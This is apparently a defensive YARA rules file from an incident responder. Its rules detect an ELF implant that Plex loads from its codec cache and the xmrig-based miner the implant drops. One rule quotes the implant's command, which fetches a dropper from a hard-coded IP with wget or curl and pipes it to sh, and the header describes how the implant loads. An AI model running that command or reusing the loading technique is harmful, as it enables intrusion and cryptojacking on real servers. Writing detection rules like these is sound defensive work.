/*
  Plex Media Server codec-cache implant and the miner it drops.

  Context: an unsigned object placed in
    <Plex config>/Library/Application Support/Plex Media Server/Codecs/<set-id>-linux-x86_64/
  is loaded by "Plex Transcoder" via FFMPEG_EXTERNAL_LIBS. The object below has no
  exports and no DT_NEEDED entries; its payload is a single .init_array constructor,
  so it runs at dlopen() time. Every transcode re-runs it.

  Scope: file scanning. The path/behaviour checks belong in the host checks documented
  in the accompanying README, not in YARA.

  Author: independent incident responder (published for defensive use)
  Date:   2026-10-18
*/

rule ELF_Plex_CodecCache_ConstructorDropper
{
    meta:
        description = "Constructor-only ELF shared object that pipes a remote dropper into sh when Plex dlopens it from the codec cache"
        reference   = "https://github.com/a3igner/plex-codec-cache-implant"
        hash256     = "a9a309154493193c70bf6f805fe70e1bc4e9564e2f0e20cd1600c72587c7e65f"
        size        = 1036800
        tlp         = "CLEAR"

    strings:
        $cmd = "(wget http://217.60.194.116/docker -O- || curl http://217.60.194.116/docker -o-)|sh"
        $sh  = "/bin/sh"

    condition:
        uint32( 0 ) == 0x464c457f and      // \x7fELF
        uint16( 16 ) == 3 and              // ET_DYN (shared object)
        filesize < 5MB and
        $cmd and
        $sh
}

rule ELF_Miner_Xmrig_ProxystreamCampaign
{
    meta:
        description = "xmrig-derived RandomX miner used in the proxystream.st campaign (dropped as x12345)"
        reference   = "https://github.com/a3igner/plex-codec-cache-implant"
        hash256     = "b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49"
        size        = 8350992
        tlp         = "CLEAR"

    strings:
        $pool    = "ota.proxystream.st" ascii wide
        $domain  = "proxystream" ascii wide nocase
        $randomx = "RandomX" ascii wide
        $donate  = "--donate-level" ascii wide
        $norun   = "no active pools, stop mining" ascii wide

    condition:
        uint32( 0 ) == 0x464c457f and
        filesize < 50MB and
        ( $pool or ( $domain and $donate ) or 3 of ( $randomx, $donate, $norun ) )
}

rule ELF_Xmrig_Generic_Renamed
{
    meta:
        description = "Renamed xmrig builds: RandomX pool client with donation strings but no version resource"
        date        = "2026-10-18"
        tlp         = "CLEAR"

    strings:
        $a = "no active pools, stop mining" ascii wide
        $b = "dev donate started" ascii wide
        $c = "xmrig.com/benchmark" ascii wide
        $d = "failed to allocate RandomX" ascii wide

    condition:
        uint32( 0 ) == 0x464c457f and
        filesize < 50MB and
        3 of them
}
